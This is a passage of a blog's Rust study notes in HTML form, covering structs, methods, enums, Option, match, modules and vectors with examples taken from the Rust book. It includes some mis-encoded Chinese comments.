class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>their first parameter is <code>always self,</code>which represents the instance of the struct the method is being called on.</p><p>impl (implementation)</p><p>Methods can<code>take ownership of self,</code> borrow<code>self immutably</code>as weâ€™ve done here, or borrow self mutably, just as they can any other parameter.<br><code>&amp;mut self</code></p><h3 id="associated-function"><a href="#associated-function" class="headerlink" title="associated function"></a>associated function</h3><p>Youâ€™ve already used the String::from associated function.</p><p>Associated functions are often used for constructors that will <code>return a new instance of the struct.</code><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[derive(Debug)]</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Rectangle &#123;</span><br><span class="line">    fn square(size: u32) -&gt; Rectangle &#123;  //æ²¡æœ‰self</span><br><span class="line">        Rectangle &#123;</span><br><span class="line">            width: size,</span><br><span class="line">            height: size,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let sq = Rectangle::square(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Each struct is allowed to have multiple impl blocks. </p><h3 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h3><p>æšä¸¾<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enum IpAddrKind &#123;</span><br><span class="line">    V4,  //V4 V6å°±æ˜¯æ‰€è°“çš„å˜ä½“</span><br><span class="line">    V6,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let four = IpAddrKind::V4;</span><br><span class="line">    let six = IpAddrKind::V6;</span><br><span class="line"></span><br><span class="line">    route(IpAddrKind::V4);</span><br><span class="line">    route(IpAddrKind::V6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn route(ip_kind: IpAddrKind) &#123;&#125;</span><br></pre></td></tr></table></figure></p><p>æšä¸¾æ¯”structæ›´ç®€æ˜<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(String),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(String::from(<span class="string">"127.0.0.1"</span>));</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">"::1"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æšä¸¾æ¯ä¸ªå˜ä½“å¯ä»¥æœ‰ä¸åŒçš„ç±»å‹<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(u8, u8, u8, u8),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">"::1"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">struct Ipv4Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Ipv6Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum IpAddr &#123;</span><br><span class="line">    V4(Ipv4Addr),</span><br><span class="line">    V6(Ipv6Addr),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Message &#123;</span><br><span class="line">    Quit,</span><br><span class="line">    Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">    Write(String),</span><br><span class="line">    ChangeColor(i32, i32, i32),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    enum Message &#123;</span><br><span class="line">        Quit,</span><br><span class="line">        Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">        Write(String),</span><br><span class="line">        ChangeColor(i32, i32, i32),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    impl Message &#123;</span><br><span class="line">        fn call(&amp;self) &#123;</span><br><span class="line">            // method body would be defined here</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let m = Message::Write(String::from(<span class="string">"hello"</span>));</span><br><span class="line">    m.call();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="enum-option"><a href="#enum-option" class="headerlink" title="enum option"></a>enum option</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">enum Option&lt;<span class="literal">T</span>&gt; &#123; //&lt;<span class="literal">T</span>&gt; means the Some variant of the Option enum can hold one piece of data of any type</span><br><span class="line">    Some(<span class="literal">T</span>),</span><br><span class="line">    None,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>optionä¸ç”¨æ˜¾ç¤ºå¼•å…¥ï¼Œå·²ç»æå‰æœ‰äº†</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_number = Some(<span class="number">5</span>);</span><br><span class="line">    let some_string = Some(<span class="string">"a string"</span>);</span><br><span class="line"></span><br><span class="line">    let absent_number: Option&lt;i32&gt; = None;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If we use None rather than Some, we need to tell Rust what<code>type of Option&lt;T&gt;</code> we have<br>Option<t> and T (where T can be any type) are different types,<br>In other words, you have to convert an Option<t> to a <code>T</code> before you can perform T operations with it. </t></t></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">match</span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br></pre></td></tr></table></figure><p>The code associated with <code>each arm is an expression</code>, and the resulting value of the expression in the matching arm is the value that gets returned for the entire match expression.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; &#123;</span><br><span class="line">            println!(<span class="string">"Lucky penny!"</span>);</span><br><span class="line">            <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[derive(Debug)]</span><br><span class="line">enum UsState &#123;</span><br><span class="line">    Alabama,</span><br><span class="line">    Alaska,</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter(UsState),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter(state) =&gt; &#123;</span><br><span class="line">            println!(<span class="string">"State quarter from &#123;:?&#125;!"</span>, state); //å¾—åˆ°coiné‡Œquarteré‡Œçš„usstateå€¼</span><br><span class="line">            <span class="number">25</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    value_in_cents(Coin::Quarter(UsState::Alaska));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨option<t><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123;</span><br><span class="line">        match x &#123;</span><br><span class="line">            None =&gt; None,</span><br><span class="line">            Some(i) =&gt; Some(i + <span class="number">1</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let five = Some(<span class="number">5</span>);</span><br><span class="line">    let six = plus_one(five);</span><br><span class="line">    let none = plus_one(None);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></t></p><p><code>Combining match and enums</code> is useful in many situations.<br>match against an enum, <code>bind a variable to the data inside,</code> and then execute code based on it.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = 0u8;</span><br><span class="line">    match some_u8_value &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; println!(<span class="string">"one"</span>),</span><br><span class="line">        <span class="number">3</span> =&gt; println!(<span class="string">"three"</span>),</span><br><span class="line">        <span class="number">5</span> =&gt; println!(<span class="string">"five"</span>),</span><br><span class="line">        <span class="number">7</span> =&gt; println!(<span class="string">"seven"</span>),</span><br><span class="line">        _ =&gt; (),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_</code>çœç•¥The _ pattern will match any value.<code>The () is just the unit value</code></p><h3 id="if-let"><a href="#if-let" class="headerlink" title="if let"></a>if let</h3><p>care about only one of the cases. For this situation, Rust provides if let.<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = Some(0u8);</span><br><span class="line">    <span class="keyword">if</span> let Some(<span class="number">3</span>) = some_u8_value &#123;</span><br><span class="line">        println!(<span class="string">"three"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> let Coin::Quarter(state) = coin &#123;</span><br><span class="line">        println!(<span class="string">"State quarter from &#123;:?&#125;!"</span>, state);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Quarter(state) =&gt; println!(<span class="string">"State quarter from &#123;:?&#125;!"</span>, state),</span><br><span class="line">        _ =&gt; count += <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="packages-gt-crates-gt-modules"><a href="#packages-gt-crates-gt-modules" class="headerlink" title="packages&gt;crates&gt;modules"></a>packages&gt;crates&gt;modules</h3><p> A package is<code>one or more crates</code>that provide a set of functionality. A package contains a Cargo.toml file that describes how to build those crates.<br>A package must contain zero or one library crates, and no more. It can contain as many binary crates as youâ€™d like, but it must <code>contain at least one crate</code> (either library or binary).<br>If a package <code>contains src/main.rs and src/lib.rs, it has two crates: a library and a binary,</code> both with the same name as the package.<br>A package can<code>have multiple binary crates by placing files in the src/bin directory:</code>each file will be a separate binary crate.</p><p>the <code>use</code> keyword that brings a path into scope; and the <code>pub</code> keyword to make items public. Weâ€™ll also discuss the as keyword, external packages, and the glob operator</p><p>Modules let us organize code within a crate into groups</p><p>Create a new library named restaurant by running <code>cargo new --lib</code>restaurant;<br>crate //implicit module  src/main.rs and src/lib.rs äº§ç”Ÿ<br> â””â”€â”€ front_of_house<br>     â”œâ”€â”€ hosting<br>     â”‚   â”œâ”€â”€ add_to_waitlist<br>     â”‚   â””â”€â”€ seat_at_table<br>     â””â”€â”€ serving<br>         â”œâ”€â”€ take_order<br>         â”œâ”€â”€ serve_order<br>         â””â”€â”€ take_payment</p><p> If we want to call a function, we need to know its path.<br>A path can take two forms:</p><p>An <code>absolute path</code> starts from a crate root by using a crate name or a literal crate.<br>A <code>relative path</code>starts from the current module and uses self, super, or an identifier in the current module.<br>Both absolute and relative paths are followed by one or more identifiers separated by double colons (<code>::</code>).</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    mod hosting &#123;</span><br><span class="line">        fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The way privacy works in Rust is that all items (<code>functions, methods, structs, enums, modules, and constants) are private by default</code>.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125; //making the module public doesnâ€™t make its contents public. </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn serve_order() &#123;&#125;</span><br><span class="line"></span><br><span class="line">mod back_of_house &#123;</span><br><span class="line">    fn fix_incorrect_order() &#123;</span><br><span class="line">        cook_order();</span><br><span class="line">        super::serve_order();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fn cook_order() &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Enums arenâ€™t very useful unless their variants are public; it would be annoying to have to annotate all enum variants with pub in every case, so the <code>default for enum variants is to be public.</code>Structs are often useful without their fields being public, so struct fields follow the general rule of <code>everything being private by default</code> unless annotated with pub.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">use</span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use crate::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use self::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="as"><a href="#as" class="headerlink" title="as"></a>as</h3><p>Thereâ€™s another solution to the problem of bringing two types of the same name into the same scope with use: after the path, we can specify <code>as and a new local name</code>, or alias, for the type.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::fmt::Result;</span><br><span class="line">use std::io::Result as IoResult;</span><br><span class="line"></span><br><span class="line">fn function1() -&gt; Result &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn function2() -&gt; IoResult&lt;()&gt; &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this technique is called re-exporting because weâ€™re bringing an item into scope but also making that item available for others to bring into their scope<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub use crate::front_of_house::hosting;  //å…¶ä»–å¯ä»¥ å¦å¤–åˆ›ç«‹ä¸€ä¸ªé“¾æ¥</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::HashMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>This is an absolute path starting with std, the name of the standard library crate.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use rand::Rng;</span><br><span class="line">// --snip--</span><br><span class="line">use std::&#123;cmp::Ordering, io&#125;;</span><br><span class="line">// --snip--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::io::&#123;self, Write&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> brings all public items </p><p>The <code>mod</code> keyword declares modules, and Rust looks in a file with the same name as the module for the code that goes into that module.</p><h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v: Vec&lt;i32&gt; = Vec::new();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; //ç±»åˆ«è‡ªå·±æ¨æµ‹</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = Vec::new();</span><br><span class="line"></span><br><span class="line">    v.push(<span class="number">5</span>);</span><br><span class="line">    v.push(<span class="number">6</span>);</span><br><span class="line">    v.push(<span class="number">7</span>);</span><br><span class="line">    v.push(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        // do stuff with v</span><br><span class="line">    &#125; // &lt;- v goes out of scope and is freed here</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    let third: &amp;i32 = &amp;v[<span class="number">2</span>];</span><br><span class="line">    println!(<span class="string">"The third element is &#123;&#125;"</span>, third);</span><br><span class="line"></span><br><span class="line">    match v.get(<span class="number">2</span>) &#123; //gives us an Option&lt;&amp;<span class="literal">T</span>&gt;.</span><br><span class="line">        Some(third) =&gt; println!(<span class="string">"The third element is &#123;&#125;"</span>, third),</span><br><span class="line">        None =&gt; println!(<span class="string">"There is no third 